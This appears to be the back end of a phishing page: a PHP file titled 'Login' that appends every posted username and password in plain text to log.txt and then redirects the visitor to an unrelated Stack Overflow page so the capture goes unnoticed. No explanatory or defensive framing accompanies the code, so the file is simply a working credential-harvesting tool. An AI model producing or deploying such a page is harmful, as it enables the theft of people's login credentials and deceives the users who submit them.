<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php

if ($_POST['Login']){

$myFile = "log.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['username'] . ":";
fwrite($fh, $stringData);
$stringData = $_POST['password'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>

<script>location.href="https://stackoverflow.com/questions/11828042/add-a-image-with-java-script-to-quiz";</script>
	 
 </body>
</html>